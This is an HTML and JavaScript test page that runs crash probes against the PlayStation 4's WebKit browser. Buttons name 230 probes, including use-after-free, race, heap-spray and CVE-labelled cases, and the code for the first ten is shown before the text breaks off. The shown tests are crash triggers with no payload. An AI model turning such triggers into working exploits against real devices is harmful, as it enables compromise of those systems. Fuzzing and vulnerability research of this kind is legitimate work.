<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit Vulnerability Tests</title>
    
</head>
<body>
    <h1>PS4 WebKit Vulnerability Test Suite</h1>
    
    <div id="testButtons">
        <button onclick="addLog('Running Test 1...'); test1_TableRowUAF()">Test 1: Table Row UAF</button>
        <button onclick="addLog('Running Test 2...'); test2_RemoveChildBlur()">Test 2: RemoveChild Blur</button>
        <button onclick="addLog('Running Test 3...'); test3_AdoptNodeRace()">Test 3: AdoptNode Race</button>
        <button onclick="addLog('Running Test 4...'); test4_FullscreenTable()">Test 4: Fullscreen Table</button>
        <button onclick="addLog('Running Test 5...'); test5_SVGDetach()">Test 5: SVG Detach</button>        
        <button onclick="addLog('Running Test 6...'); test6_RangeDeleteContents()">Test 6: Range DeleteContents</button>
        <button onclick="addLog('Running Test 7...'); test7_WebSocketRace()">Test 7: WebSocket Race</button>
        <button onclick="addLog('Running Test 8...'); test8_CanvasUAF()">Test 8: Canvas UAF</button>
        <button onclick="addLog('Running Test 9...'); test9_VideoEmptied()">Test 9: Video Emptied</button>
        <button onclick="addLog('Running Test 10...'); test10_IframeDetach()">Test 10: Iframe Detach</button>    
        <button onclick="addLog('Running Test 11...'); test11_CSSOMRace()">Test 11: CSSSOM Race</button>
        <button onclick="addLog('Running Test 12...'); test12_InnerHTMLHash()">Test 12: innerHTML Hash</button>
        <button onclick="addLog('Running Test 13...'); test13_CloneNodeTouch()">Test 13: CloneNode Touch</button>
        <button onclick="addLog('Running Test 14...'); test14_WorkerTerminate()">Test 14: Worker Terminate</button>
        <button onclick="addLog('Running Test 15...'); test15_StorageDelete()">Test 15: Storage Delete</button>       
        <button onclick="addLog('Running Test 16...'); test16_FormReset()">Test 16: Form Reset</button>
        <button onclick="addLog('Running Test 17...'); test17_PopstateReplace()">Test 17: Popstate Replace</button>
        <button onclick="addLog('Running Test 18...'); test18_DragRemove()">Test 18: Drag Remove</button>
        <button onclick="addLog('Running Test 19...'); test19_AudioError()">Test 19: Audio Error</button>
        <button onclick="addLog('Running Test 20...'); test20_InsertAdjacent()">Test 20: InsertAdjacent</button>      
        <button onclick="addLog('Running Test 21...'); test21_FragmentPageHide()">Test 21: Fragment PageHide</button>
        <button onclick="addLog('Running Test 22...'); test22_TableHeadUAF()">Test 22: Table Head UAF</button>
        <button onclick="addLog('Running Test 23...'); test23_SVGMatrix()">Test 23: SVG Matrix</button>
        <button onclick="addLog('Running Test 24...'); test24_ImportNodeUnload()">Test 24: ImportNode Unload</button>
        <button onclick="addLog('Running Test 25...'); test25_CanvasDataURL()">Test 25: Canvas DataURL</button>   
        <button onclick="addLog('Running Test 26...'); test26_TextareaRange()">Test 26: Textarea Range</button>
        <button onclick="addLog('Running Test 27...'); test27_VideoTimeUpdate()">Test 27: Video TimeUpdate</button>
        <button onclick="addLog('Running Test 28...'); test28_WebGLLoseContext()">Test 28: WebGL LoseContext</button>
        <button onclick="addLog('Running Test 29...'); test29_MessageChannel()">Test 29: MessageChannel</button>
        <button onclick="addLog('Running Test 30...'); test30_OuterHTMLAnimation()">Test 30: OuterHTML Animation</button>    
        <button onclick="addLog('Running Test 31...'); test31_IndexedDBRecursive()">Test 31: IndexedDB Recursive</button>
        <button onclick="addLog('Running Test 32...'); test32_SVGSuspendRedraw()">Test 32: SVG SuspendRedraw</button>
        <button onclick="addLog('Running Test 33...'); test33_TextContentPointer()">Test 33: TextContent Pointer</button>
        <button onclick="addLog('Running Test 34...'); test34_CSSTextVolume()">Test 34: CSSText Volume</button>
        <button onclick="addLog('Running Test 35...'); test35_NestedIframes()">Test 35: Nested Iframes</button>
        <button onclick="addLog('Running Test 36...'); test36_TableFootStalled()">Test 36: Table Foot Stalled</button>
        <button onclick="addLog('Running Test 37...'); test37_IndexDeleteSuspend()">Test 37: Index Delete Suspend</button>
        <button onclick="addLog('Running Test 38...'); test38_CSSMediaCanPlay()">Test 38: CSS Media CanPlay</button>
        <button onclick="addLog('Running Test 39...'); test39_WebGLBufferCanPlay()">Test 39: WebGL Buffer CanPlay</button>
        <button onclick="addLog('Running Test 40...'); test40_WebGLTextureWaiting()">Test 40: WebGL Texture Waiting</button>        
        <button onclick="addLog('Running Test 41...'); test41_CloseBrowsingContext()">Test 41: Close Browsing Context</button>
        <button onclick="addLog('Running Test 42...'); test42_ReleaseLockMetadata()">Test 42: Release Lock Metadata</button>
        <button onclick="addLog('Running Test 43...'); test43_SVGForceRedraw()">Test 43: SVG Force Redraw</button>
        <button onclick="addLog('Running Test 44...'); test44_IsPointInPath()">Test 44: IsPointInPath</button>
        <button onclick="addLog('Running Test 45...'); test45_SVGPathSeg()">Test 45: SVG Path Seg</button>       
        <button onclick="addLog('Running Test 46...'); test46_GetSVGDocument()">Test 46: Get SVG Document</button>
        <button onclick="addLog('Running Test 47...'); test47_InsertBeforeAnimation()">Test 47: InsertBefore Animation</button>
        <button onclick="addLog('Running Test 48...'); test48_InsertAdjacentEnded()">Test 48: InsertAdjacent Ended</button>
        <button onclick="addLog('Running Test 49...'); test49_InsertAdjacentText()">Test 49: InsertAdjacentText</button>
        <button onclick="addLog('Running Test 50...'); test50_AddRuleTransition()">Test 50: AddRule Transition</button>     
        <button onclick="addLog('Running Test 51...'); test51_RemoveRuleMessage()">Test 51: RemoveRule Message</button>
        <button onclick="addLog('Running Test 52...'); test52_SetPropertyStorage()">Test 52: SetProperty Storage</button>
        <button onclick="addLog('Running Test 53...'); test53_RemovePropertyHash()">Test 53: RemoveProperty Hash</button>
        <button onclick="addLog('Running Test 54...'); test54_CreateImageDataError()">Test 54: CreateImageData Error</button>
        <button onclick="addLog('Running Test 55...'); test55_SVGTransformClose()">Test 55: SVG Transform Close</button>      
        <button onclick="addLog('Running Test 56...'); test56_SVGRectTouch()">Test 56: SVGRect Touch</button>
        <button onclick="addLog('Running Test 57...'); test57_PutImageDataDrag()">Test 57: PutImageData Drag</button>
        <button onclick="addLog('Running Test 58...'); test58_WorkerPageHide()">Test 58: Worker PageHide</button>
        <button onclick="addLog('Running Test 59...'); test59_WindowClosePageShow()">Test 59: Window Close PageShow</button>
        <button onclick="addLog('Running Test 60...'); test60_MultipleDeleteDB()">Test 60: Multiple DeleteDB</button>     
        <button onclick="addLog('Running Test 61...'); test61_CloneNodeScroll()">Test 61: CloneNode Scroll</button>
        <button onclick="addLog('Running Test 62...'); test62_AdoptNodeFullscreenError()">Test 62: AdoptNode FullscreenError</button>
        <button onclick="addLog('Running Test 63...'); test63_MatchMediaDeleteRule()">Test 63: MatchMedia DeleteRule</button>
        <button onclick="addLog('Running Test 64...'); test64_ImportInsertRace()">Test 64: Import Insert Race</button>
        <button onclick="addLog('Running Test 65...'); test65_SVGVideoTable()">Test 65: SVG Video Table</button>       
        <button onclick="addLog('Running Test 66...'); test66_FormCanvasIndexedDB()">Test 66: Form Canvas IndexedDB</button>
        <button onclick="addLog('Running Test 67...'); test67_TextareaRangeComplex()">Test 67: Textarea Range Complex</button>
        <button onclick="addLog('Running Test 68...'); test68_DeleteCellAnimation()">Test 68: DeleteCell Animation</button>
        <button onclick="addLog('Running Test 69...'); test69_UnsuspendRedrawResize()">Test 69: UnsuspendRedraw Resize</button>
        <button onclick="addLog('Running Test 70...'); test70_IsPointInStrokeSeek()">Test 70: IsPointInStroke Seek</button>
        <button onclick="addLog('Running Test 71...'); test71_ReleaseEventsFocus()">Test 71: ReleaseEvents Focus</button>
        <button onclick="addLog('Running Test 72...'); test72_OuterHTMLToggle()">Test 72: OuterHTML Toggle</button>        
        <button onclick="addLog('Running Test 73...'); test73_RemoveCueChange()">Test 73: Remove CueChange</button>
        <button onclick="addLog('Running Test 74...'); test74_AdoptNodeContext()">Test 74: AdoptNode ContextMenu</button>
        <button onclick="addLog('Running Test 75...'); test75_DeleteMediumChange()">Test 75: DeleteMedium Change</button>
        <button onclick="addLog('Running Test 76...'); test76_WebGLContextLost()">Test 76: WebGL ContextLost</button>
        <button onclick="addLog('Running Test 77...'); test77_InsertRuleInvalid()">Test 77: InsertRule Invalid</button>       
        <button onclick="addLog('Running Test 78...'); test78_CreateFragmentDblClick()">Test 78: Fragment DblClick</button>
        <button onclick="addLog('Running Test 79...'); test79_TextContentCopy()">Test 79: TextContent Copy</button>
        <button onclick="addLog('Running Test 80...'); test80_DeleteDatabaseAbort()">Test 80: DeleteDB Abort</button>
        <button onclick="addLog('Running Test 81...'); test81_ObjectStoreVersion()">Test 81: ObjectStore Version</button>
        <button onclick="addLog('Running Test 82...'); test82_ImportNodeEnter()">Test 82: ImportNode MouseEnter</button>        
        <button onclick="addLog('Running Test 83...'); test83_CloneNodeLeave()">Test 83: CloneNode MouseLeave</button>
        <button onclick="addLog('Running Test 84...'); test84_DeleteCaptionPaste()">Test 84: DeleteCaption Paste</button>
        <button onclick="addLog('Running Test 85...'); test85_ReplaceChildCut()">Test 85: ReplaceChild Cut</button>
        <button onclick="addLog('Running Test 86...'); test86_InsertBeforeInput()">Test 86: InsertBefore Input</button>
        <button onclick="addLog('Running Test 87...'); test87_RemoveChildSelection()">Test 87: RemoveChild Selection</button>       
        <button onclick="addLog('Running Test 88...'); test88_CSSTextWheel()">Test 88: CSSText Wheel</button>
        <button onclick="addLog('Running Test 89...'); test89_DeleteRowFullscreen()">Test 89: DeleteRow Fullscreen</button>
        <button onclick="addLog('Running Test 90...'); test90_TerminateNestedWorker()">Test 90: Terminate Nested Worker</button>
        <button onclick="addLog('Running Test 91...'); test91_CloseWebSocketUnload()">Test 91: Close WS Unload</button>
        <button onclick="addLog('Running Test 92...'); test92_DetachRangeSelection()">Test 92: Detach Range Selection</button>
       
        <button onclick="addLog('Running Test 93...'); test93_RemoveRuleTransition()">Test 93: RemoveRule Transition</button>
        <button onclick="addLog('Running Test 94...'); test94_CreateImageDataPrint()">Test 94: CreateImageData Print</button>
        <button onclick="addLog('Running Test 95...'); test95_SVGPointStroke()">Test 95: SVG Point Stroke</button>
        <button onclick="addLog('Running Test 96...'); test96_CanvasPatternBlur()">Test 96: Canvas Pattern Blur</button>
        <button onclick="addLog('Running Test 97...'); test97_RecursiveObjectStore()">Test 97: Recursive ObjectStore</button>

        <button onclick="addLog('Running Test 98...'); test98_TreeWalkerRemove()">Test 98: TreeWalker Remove</button>
        <button onclick="addLog('Running Test 99...'); test99_NodeIteratorReplace()">Test 99: NodeIterator Replace</button>
        <button onclick="addLog('Running Test 100...'); test100_MutationObserverLoop()">Test 100: MutationObserver Loop</button>
        <button onclick="addLog('Running Test 101...'); test101_RangeSurroundExtract()">Test 101: Range Surround/Extract</button>
        <button onclick="addLog('Running Test 102...'); test102_SelectionModifyCrash()">Test 102: Selection Modify Crash</button>        
        <button onclick="addLog('Running Test 103...'); test103_DOMParserAbort()">Test 103: DOMParser Abort</button>
        <button onclick="addLog('Running Test 104...'); test104_CanvasBlobRace()">Test 104: Canvas Blob Race</button>
        <button onclick="addLog('Running Test 105...'); test105_XHRSyncPageHide()">Test 105: XHR Sync PageHide</button>
        <button onclick="addLog('Running Test 106...'); test106_FontFaceClear()">Test 106: FontFace Clear</button>
        <button onclick="addLog('Running Test 107...'); test107_NavigatorLocksRace()">Test 107: Navigator Locks Race</button>       
        <button onclick="addLog('Running Test 108...'); test108_StyleMediaMatch()">Test 108: StyleMedia Match</button>
        <button onclick="addLog('Running Test 109...'); test109_CreateNodeIteratorFilter()">Test 109: Iterator Filter Detach</button>
        <button onclick="addLog('Running Test 110...'); test110_TextTrackCueRemove()">Test 110: TextTrack Cue Remove</button>
        <button onclick="addLog('Running Test 111...'); test111_AnimationPlayState()">Test 111: Animation PlayState</button>
        <button onclick="addLog('Running Test 112...'); test112_CryptoLargeBuffer()">Test 112: Crypto Large Buffer</button>    
        <button onclick="addLog('Running Test 113...'); test113_HistoryPushStateFlood()">Test 113: History Flood</button>
        <button onclick="addLog('Running Test 114...'); test114_FormRequestSubmit()">Test 114: Form RequestSubmit</button>
        <button onclick="addLog('Running Test 115...'); test115_SVGUseShadowTree()">Test 115: SVG Use ShadowTree</button>
        <button onclick="addLog('Running Test 116...'); test116_CanvasClipStack()">Test 116: Canvas Clip Stack</button>
        <button onclick="addLog('Running Test 117...'); test117_DataTransferDragImage()">Test 117: DragImage Removal</button>       
        <button onclick="addLog('Running Test 118...'); test118_HTMLOptionsCollection()">Test 118: Options Length Set</button>
        <button onclick="addLog('Running Test 119...'); test119_IframeSrcdocRace()">Test 119: Iframe Srcdoc Race</button>
        <button onclick="addLog('Running Test 120...'); test120_WorkerTransferable()">Test 120: Worker Transferable</button>
        <button onclick="addLog('Running Test 121...'); test121_SlotAssignment()">Test 121: Slot Assignment</button>
        <button onclick="addLog('Running Test 122...'); test122_AudioBufferSource()">Test 122: AudioBuffer Detach</button>       
        <button onclick="addLog('Running Test 123...'); test123_OffscreenCanvas()">Test 123: OffscreenCanvas Race</button>
        <button onclick="addLog('Running Test 124...'); test124_ResizeObserverLoop()">Test 124: ResizeObserver Loop</button>
        <button onclick="addLog('Running Test 125...'); test125_IntersectionObserver()">Test 125: IntersectionObserver</button>
        <button onclick="addLog('Running Test 126...'); test126_CustomElementUpgrade()">Test 126: Element Upgrade</button>
        <button onclick="addLog('Running Test 127...'); test127_FinalCrashToggle()">Test 127: FINAL CRASH TOGGLE</button>        
        <button onclick="addLog('Running Test 128...'); test128_TableCaptionLoop()">Test 128: Caption UAF Loop</button>
        <button onclick="addLog('Running Test 129...'); test129_SelectionDetachRace()">Test 129: Selection Detach</button>
        <button onclick="addLog('Running Test 130...'); test130_SVGTextLayoutCrash()">Test 130: SVG Text Layout</button>
        <button onclick="addLog('Running Test 131...'); test131_PointerCaptureRemove()">Test 131: Pointer Capture Remove</button>
        <button onclick="addLog('Running Test 132...'); test132_RangeInsertFrag()">Test 132: Range Insert Frag</button>
        
        <button onclick="addLog('Running Test 133...'); test133_SplitTextNormalize()">Test 133: SplitText Normalize</button>
        <button onclick="addLog('Running Test 134...'); test134_StyleItemMutation()">Test 134: Style Item Mutation</button>
        <button onclick="addLog('Running Test 135...'); test135_InputTypeSwitch()">Test 135: Input Type Switch</button>
        <button onclick="addLog('Running Test 136...'); test136_SVGAnimateRemove()">Test 136: SVG Animate Remove</button>
        <button onclick="addLog('Running Test 137...'); test137_TreeWalkerFilterThrow()">Test 137: Walker Filter Throw</button>        
        <button onclick="addLog('Running Test 138...'); test138_MediaSourceRemove()">Test 138: MediaSource Remove</button>
        <button onclick="addLog('Running Test 139...'); test139_WindowStopRace()">Test 139: Window Stop Race</button>
        <button onclick="addLog('Running Test 140...'); test140_OffsetParentDisplay()">Test 140: OffsetParent Display</button>
        <button onclick="addLog('Running Test 141...'); test141_ScrollIntoViewRemove()">Test 141: Scroll Remove</button>
        <button onclick="addLog('Running Test 142...'); test142_FormResetOutput()">Test 142: Form Reset Output</button>        
        <button onclick="addLog('Running Test 143...'); test143_GradientCycle()">Test 143: SVG Gradient Cycle</button>
        <button onclick="addLog('Running Test 144...'); test144_DetailsToggleLoop()">Test 144: Details Toggle Loop</button>
        <button onclick="addLog('Running Test 145...'); test145_KeyframesMutation()">Test 145: Keyframes Mutation</button>
        <button onclick="addLog('Running Test 146...'); test146_XPathNamespace()">Test 146: XPath Namespace</button>
        <button onclick="addLog('Running Test 147...'); test147_SlotAssignCrash()">Test 147: Slot Assign Crash</button>        
        <button onclick="addLog('Running Test 148...'); test148_AudioParamCancel()">Test 148: AudioParam Cancel</button>
        <button onclick="addLog('Running Test 149...'); test149_CanvasPatternZero()">Test 149: Canvas Pattern 0x0</button>
        <button onclick="addLog('Running Test 150...'); test150_DOMSubtreeRemove()">Test 150: Subtree Mod Remove</button>
        <button onclick="addLog('Running Test 151...'); test151_RubyBaseMerge()">Test 151: Ruby Base Merge</button>
        <button onclick="addLog('Running Test 152...'); test152_ObjectDataAttr()">Test 152: Object Data Attr</button>        
        <button onclick="addLog('Running Test 153...'); test153_TextareaWrapCrash()">Test 153: Textarea Wrap</button>
        <button onclick="addLog('Running Test 154...'); test154_FetchAbortSignal()">Test 154: Fetch Abort Signal</button>
        <button onclick="addLog('Running Test 155...'); test155_MapGarbageCollect()">Test 155: Map GC Pressure</button>
        <button onclick="addLog('Running Test 156...'); test156_LargeStringStack()">Test 156: Large String Stack</button>
        <button onclick="addLog('Running Test 157...'); test157_DocumentOpenBlast()">Test 157: Document Open Blast</button>
        <button onclick="addLog('Running Test 158...'); test158_DeleteTFootFullscreen()">Test 158: TFoot Fullscreen Race</button>
        <button onclick="addLog('Running Test 159...'); test159_AdoptWalkerRace()">Test 159: AdoptNode TreeWalker</button>
        <button onclick="addLog('Running Test 160...'); test160_SVGTransformResize()">Test 160: SVG Transform Resize</button>
        <button onclick="addLog('Running Test 161...'); test161_PathSegFrame()">Test 161: PathSeg AnimationFrame</button>
        <button onclick="addLog('Running Test 162...'); test162_SVGDocIframeRem()">Test 162: SVGDoc Iframe Remove</button>       
        <button onclick="addLog('Running Test 163...'); test163_ImportMutation()">Test 163: ImportNode Mutation</button>
        <button onclick="addLog('Running Test 164...'); test164_ReplaceFocusIn()">Test 164: ReplaceChild FocusIn</button>
        <button onclick="addLog('Running Test 165...'); test165_RemoveFocusOut()">Test 165: RemoveChild FocusOut</button>
        <button onclick="addLog('Running Test 166...'); test166_InnerNodeRemoved()">Test 166: InnerHTML NodeRemoved</button>
        <button onclick="addLog('Running Test 167...'); test167_OuterNodeInserted()">Test 167: OuterHTML NodeInserted</button>        
        <button onclick="addLog('Running Test 168...'); test168_TextCharMod()">Test 168: Text CharacterMod</button>
        <button onclick="addLog('Running Test 169...'); test169_DeleteCellColspan()">Test 169: DeleteCell ColSpan</button>
        <button onclick="addLog('Running Test 170...'); test170_DeleteRowRowspan()">Test 170: DeleteRow RowSpan</button>
        <button onclick="addLog('Running Test 171...'); test171_SuspendAlertRace()">Test 171: SuspendRedraw Alert</button>
        <button onclick="addLog('Running Test 172...'); test172_CanvasWorkerMsg()">Test 172: Canvas Worker Message</button>       
        <button onclick="addLog('Running Test 173...'); test173_WebGLLoseRestore()">Test 173: WebGL Lose/Restore</button>
        <button onclick="addLog('Running Test 174...'); test174_IDBCursorDelete()">Test 174: IDB Cursor Delete</button>
        <button onclick="addLog('Running Test 175...'); test175_IDBIndexAbort()">Test 175: IDB CreateIndex Abort</button>
        <button onclick="addLog('Running Test 176...'); test176_SelectionThrash()">Test 176: Selection Add/Remove</button>
        <button onclick="addLog('Running Test 177...'); test177_RangeDetachSet()">Test 177: Range Detach Set</button>       
        <button onclick="addLog('Running Test 178...'); test178_HistoryStateBlob()">Test 178: History State Blob</button>
        <button onclick="addLog('Running Test 179...'); test179_WindowOpenMessage()">Test 179: Window Open Message</button>
        <button onclick="addLog('Running Test 180...'); test180_CSSMediaNested()">Test 180: CSS Media Nested</button>
        <button onclick="addLog('Running Test 181...'); test181_CSSDeleteRandom()">Test 181: CSS Delete Random</button>
        <button onclick="addLog('Running Test 182...'); test182_CanvasInfinity()">Test 182: Canvas Point Infinity</button>       
        <button onclick="addLog('Running Test 183...'); test183_TrackModeSwitch()">Test 183: Track Mode Switch</button>
        <button onclick="addLog('Running Test 184...'); test184_ObjectDataMutation()">Test 184: Object Data Mutation</button>
        <button onclick="addLog('Running Test 185...'); test185_DetailsSummaryRem()">Test 185: Details Summary Rem</button>
        <button onclick="addLog('Running Test 186...'); test186_TableSectionSwap()">Test 186: Table Section Swap</button>
        <button onclick="addLog('Running Test 187...'); test187_StormFinal()">Test 187: STORM FINAL</button>
        <button onclick="addLog('Running Test 188...'); test188_TableRowSectionSwap()">Test 188: Table Row Swap</button>
        <button onclick="addLog('Running Test 189...'); test189_SVGTransformConsolidate()">Test 189: SVG Transform Consolidate</button>
        <button onclick="addLog('Running Test 190...'); test190_CanvasFontRace()">Test 190: Canvas Font Race</button>
        <button onclick="addLog('Running Test 191...'); test191_RangeCompareDetached()">Test 191: Range Compare Detached</button>
        <button onclick="addLog('Running Test 192...'); test192_SelectionCollapseNull()">Test 192: Selection Collapse Null</button>        
        <button onclick="addLog('Running Test 193...'); test193_ObjectTypeCycle()">Test 193: Object Type Cycle</button>
        <button onclick="addLog('Running Test 194...'); test194_AudioContextClose()">Test 194: AudioContext Close Race</button>
        <button onclick="addLog('Running Test 195...'); test195_WorkerMessagePingPong()">Test 195: Worker PingPong Transfer</button>
        <button onclick="addLog('Running Test 196...'); test196_StyleSheetDisabled()">Test 196: StyleSheet Disabled</button>
        <button onclick="addLog('Running Test 197...'); test197_IframeSandboxToggle()">Test 197: Iframe Sandbox Toggle</button>        
        <button onclick="addLog('Running Test 198...'); test198_SVGUseDeep()">Test 198: SVG Use Deep</button>
        <button onclick="addLog('Running Test 199...'); test199_InsertIntoDocEvent()">Test 199: InsertIntoDoc Event</button>
        <button onclick="addLog('Running Test 200...'); test200_AttrModifiedRemove()">Test 200: AttrModified Remove</button>
        <button onclick="addLog('Running Test 201...'); test201_TableScopeThrash()">Test 201: Table Scope Thrash</button>
        <button onclick="addLog('Running Test 202...'); test202_CanvasPixelOOM()">Test 202: Canvas Pixel OOM</button>       
        <button onclick="addLog('Running Test 203...'); test203_ScrollEventRemove()">Test 203: Scroll Event Remove</button>
        <button onclick="addLog('Running Test 204...'); test204_FocusBlurChain()">Test 204: Focus Blur Chain</button>
        <button onclick="addLog('Running Test 205...'); test205_InputListSwap()">Test 205: Input List Swap</button>
        <button onclick="addLog('Running Test 206...'); test206_VideoPosterRace()">Test 206: Video Poster Race</button>
        <button onclick="addLog('Running Test 207...'); test207_TrackKindSwitch()">Test 207: Track Kind Switch</button>        
        <button onclick="addLog('Running Test 208...'); test208_FormTargetRemove()">Test 208: Form Target Remove</button>
        <button onclick="addLog('Running Test 209...'); test209_SelectOptionsAPI()">Test 209: Select Options API</button>
        <button onclick="addLog('Running Test 210...'); test210_TextareaSelection()">Test 210: Textarea Selection OOB</button>
        <button onclick="addLog('Running Test 211...'); test211_CSSImportRace()">Test 211: CSS Import Race</button>
        <button onclick="addLog('Running Test 212...'); test212_SVGFilterPrimitive()">Test 212: SVG Filter Primitive</button>       
        <button onclick="addLog('Running Test 213...'); test213_CanvasComposite()">Test 213: Canvas Composite</button>
        <button onclick="addLog('Running Test 214...'); test214_NodeContainsSelf()">Test 214: Node Contains Self</button>
        <button onclick="addLog('Running Test 215...'); test215_TreeWalkerPrev()">Test 215: TreeWalker Previous</button>
        <button onclick="addLog('Running Test 216...'); test216_CryptoFlood()">Test 216: Crypto Flood</button>
        <button onclick="addLog('Running Test 217...'); test217_FinalChaos()">Test 217: FINAL CHAOS</button>        
        <button onclick="addLog('Running Test 218...'); test218_ICUNormalizeOverflow()">Test 218: ICU Normalize (CVE-2025-43429)</button>
        <button onclick="addLog('Running Test 219...'); test219_DOMWrapperWorldUAF()">Test 219: DOMWrapperWorld UAF</button>
        <button onclick="addLog('Running Test 220...'); test220_RenderLayerUAF()">Test 220: RenderLayer UAF</button>        
        <button onclick="addLog('Running Test 221...'); test221_DNGImageCrash()">Test 221: Malformed DNG (CVE-2025-43300)</button>
        <button onclick="addLog('Running Test 222...'); test222_ContentVisibilityUAF()">Test 222: Content-Visibility UAF</button>
        <button onclick="addLog('Running Test 223...'); test223_FullscreenSprayRace()">Test 223: Fullscreen Heap Spray</button>
        <button onclick="addLog('Running Test 224...'); test224_AnimationDestructor()">Test 224: CSS Animation Destructor</button>
        <button onclick="addLog('Running Test 225...'); test225_RopeStringOverflow()">Test 225: Rope String Overflow</button>      
        <button onclick="addLog('Running Test 226...'); test226_FullscreenTeardown()">Test 226: Fullscreen Teardown</button>
        <button onclick="addLog('Running Test 227...'); test227_FullscreenRace()">Test 227: Fullscreen Race</button>
        <button onclick="addLog('Running Test 228...'); test228_AnimationRemoval()">Test 228: Animation Removal</button>
        <button onclick="addLog('Running Test 229...'); test229_CanvasContextUAF()">Test 229: Canvas Context UAF</button>
        <button onclick="addLog('Running Test 230...'); test230_ContentVisibilityRemove()">Test 230: Content-Visibility Remove</button>
    </div>
    

    <div id="log"></div>   
    <div id="testArea"></div>


    <script>
        const log = document.getElementById('log');
        const testArea = document.getElementById('testArea');
        // testButtons var kept to avoid errors if referenced, though unused now in script
        const testButtons = document.getElementById('testButtons');
        let crashes = 0;

        function addLog(msg, isError = false) {
            const p = document.createElement('p');
            p.textContent = `[${new Date().toISOString()}] ${msg}`;
            if (isError) p.textContent = '?? ' + p.textContent;
            log.appendChild(p);
            console.log(msg);
            log.scrollTop = log.scrollHeight;
        }

        function clearLog() {
            log.innerHTML = '';
            crashes = 0;
            addLog('Log cleared');
        }

        function clearTestArea() {
            testArea.innerHTML = '';
            addLog('Test area cleared');
        }

        // Test 1: UAF via deleteRow + Event Handler
        function test1_TableRowUAF() {
            // addLog('TEST 1: Table Row UAF via deleteRow + onfocus');
            try {
                const table = document.createElement('table');
                const tbody = table.createTBody();
                const row = tbody.insertRow();
                const cell = row.insertCell();
                
                row.onfocus = function() {
                    tbody.deleteRow(0);
                    cell.textContent = 'UAF trigger';
                };
                
                testArea.appendChild(table);
                row.focus();
                setTimeout(() => row.blur(), 10);
            } catch(e) {
                addLog('Test 1 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // Test 2: Race condition - removeChild + onblur
        function test2_RemoveChildBlur() {
            // addLog('TEST 2: removeChild during onblur');
            try {
                const div = document.createElement('div');
                const input = document.createElement('input');
                
                input.onblur = function() {
                    div.removeChild(input);
                    input.focus();
                };
                
                div.appendChild(input);
                testArea.appendChild(div);
                input.focus();
                setTimeout(() => input.blur(), 10);
            } catch(e) {
                addLog('Test 2 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // Test 3: adoptNode + replaceChild race
        function test3_AdoptNodeRace() {
            // addLog('TEST 3: adoptNode + replaceChild race condition');
            try {
                const iframe1 = document.createElement('iframe');
                const iframe2 = document.createElement('iframe');
                testArea.appendChild(iframe1);
                testArea.appendChild(iframe2);
                
                iframe1.onload = function() {
                    const doc1 = iframe1.contentDocument;
                    const doc2 = iframe2.contentDocument;
                    const div = doc1.createElement('div');
                    
                    div.onbeforeunload = function() {
                        doc2.adoptNode(div);
                        doc1.body.replaceChild(div, doc1.body.firstChild);
                    };
                    
                    doc1.body.appendChild(div);
                    iframe1.src = 'about:blank';
                };
                
                iframe1.src = 'about:blank';
            } catch(e) {
                addLog('Test 3 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // Test 4: WebKit fullscreen + deleteCaption
        function test4_FullscreenTable() {
            // addLog('TEST 4: webkitRequestFullscreen + deleteCaption');
            try {
                const table = document.createElement('table');
                const caption = table.createCaption();
                caption.textContent = 'Test';
                
                table.onwebkitfullscreenchange = function() {
                    table.deleteCaption();
                    table.createCaption().textContent = 'New';
                };
                
                testArea.appendChild(table);
                if (table.webkitRequestFullscreen) {
                    table.webkitRequestFullscreen();
                    setTimeout(() => {
                        if (document.webkitExitFullscreen) {
                            document.webkitExitFullscreen();
                        }
                    }, 100);
                }
            } catch(e) {
                addLog('Test 4 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // Test 5: SVG + detach + onanimationend
        function test5_SVGDetach() {
            // addLog('TEST 5: SVG element detach during animation');
            try {
                const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
                const rect = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
                
                rect.onwebkitanimationend = function() {
                    svg.removeChild(rect);
                    rect.setAttribute('x', '100');
                };
                
                svg.appendChild(rect);
                testArea.appendChild(svg);
            } catch(e) {
                addLog('Test 5 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // Test 6: Range deleteContents + Selection
        function test6_RangeDeleteContents() {
            // addLog('TEST 6: Range.deleteContents with Selection');
            try {
                const div = document.createElement('div');
                div.innerHTML = 'Test content for selection';
                testArea.appendChild(div);
                
                const range = document.createRange();
                range.selectNodeContents(div);
                
                div.onselect = function() {
                    range.deleteContents();
                    div.textContent = 'Modified';
                };
                
                const selection = window.getSelection();
                selection.removeAllRanges();
                selection.addRange(range);
            } catch(e) {
                addLog('Test 6 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // Test 7: WebSocket close + onmessage
        function test7_WebSocketRace() {
            // addLog('TEST 7: WebSocket close during onmessage');
            try {
                const ws = new WebSocket('ws://localhost:9999');
                
                ws.onmessage = function(e) {
                    ws.close();
                    ws.send('after close');
                };
                
                ws.onerror = function() {
                    addLog('WebSocket error (expected)');
                };
            } catch(e) {
                addLog('Test 7 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // Test 8: Canvas getImageData + removeChild
        function test8_CanvasUAF() {
            // addLog('TEST 8: Canvas getImageData after removal');
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 100;
                canvas.height = 100;
                const ctx = canvas.getContext('2d');
                
                testArea.appendChild(canvas);
                
                setTimeout(() => {
                    testArea.removeChild(canvas);
                    const imageData = ctx.getImageData(0, 0, 100, 100);
                    ctx.putImageData(imageData, 0, 0);
                }, 10);
            } catch(e) {
                addLog('Test 8 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // Test 9: Video element + onemptied + IndexedDB
        function test9_VideoEmptied() {
            // addLog('TEST 9: Video onemptied + IndexedDB');
            try {
                const video = document.createElement('video');
                
                video.onemptied = function() {
                    const request = indexedDB.open('testDB', 1);
                    request.onupgradeneeded = function(e) {
                        const db = e.target.result;
                        const store = db.createObjectStore('test', {keyPath: 'id'});
                        db.deleteObjectStore('test');
                    };
                };
                
                testArea.appendChild(video);
                video.src = 'data:video/mp4;base64,AAAAAA==';
                video.load();
            } catch(e) {
                addLog('Test 9 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // Test 10: Multiple iframe detach + onpageshow
        function test10_IframeDetach() {
            // addLog('TEST 10: Multiple iframe detach during onpageshow');
            try {
                const iframes = [];
